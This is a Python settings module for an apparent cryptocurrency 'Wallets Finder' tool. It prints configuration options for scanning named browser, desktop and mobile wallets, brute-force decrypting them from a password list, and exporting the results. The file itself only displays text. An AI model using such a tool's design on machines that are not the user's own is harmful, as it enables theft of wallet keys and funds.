# -*- coding: utf-8 -*-
"""Settings action — scan configuration, wallet targets, export preferences."""

from pathlib import Path

from rich.table import Table
from rich.panel import Panel
from rich import box

from finder.ui import console, print_info, print_warning


def action_settings():
    """Display setup instructions: config.json, scan paths, export settings."""
    table = Table(
        show_header=True,
        header_style="bold bright_cyan",
        border_style="cyan",
        box=box.ROUNDED,
        title="[bold bright_cyan] ◈ CONFIGURATION ◈ [/]",
        title_style="bright_cyan",
    )
    table.add_column("Setting", style="bright_cyan")
    table.add_column("Description", style="dim")
    table.add_column("Example", style="bright_black")

    table.add_row("scan.mode", "Scan mode (quick or deep)", "quick / deep")
    table.add_row("scan.threads", "Number of scan threads", "4")
    table.add_row("scan.include_browsers", "Scan browser extensions", "true")
    table.add_row("scan.include_desktop", "Scan desktop wallets", "true")
    table.add_row("scan.include_mobile_backups", "Scan mobile backup files", "true")
    table.add_row("scan.custom_paths", "Additional directories to scan", '["D:\\Wallets"]')
    table.add_row("extraction.auto_decrypt", "Auto-attempt decryption", "true")
    table.add_row("extraction.password_file", "Password list for decryption", "passwords.txt")
    table.add_row("extraction.export_format", "Output format", "json / csv / zip")
    table.add_row("extraction.encrypt_exports", "Encrypt exported files", "true")

    panel = Panel(
        table,
        title="[bold cyan] Wallets Finder Settings [/]",
        border_style="bright_cyan",
        box=box.DOUBLE,
    )

    console.print()
    console.print(panel)

    base_dir = Path(__file__).parent.parent
    config_path = base_dir / "config.json"

    console.print()
    console.print("[dim]Configuration files:[/]")
    console.print(f"  [bright_cyan]config.json[/]  → {config_path}")
    console.print()
    console.print(
        "[bright_cyan]Scan targets:[/]\n"
        "  • [dim]Browser extensions: MetaMask, Phantom, Ronin, Keplr, MathWallet[/]\n"
        "  • [dim]Desktop wallets: Exodus, Electrum, Atomic, Jaxx, Guarda, Coinomi[/]\n"
        "  • [dim]Mobile backups: Trust Wallet, Coinomi, BRD[/]"
    )
    console.print()
    print_warning("Exported wallet data is sensitive. Always use encrypted exports.")
    print_info("Edit config.json with any text editor (e.g. VS Code, Notepad).")
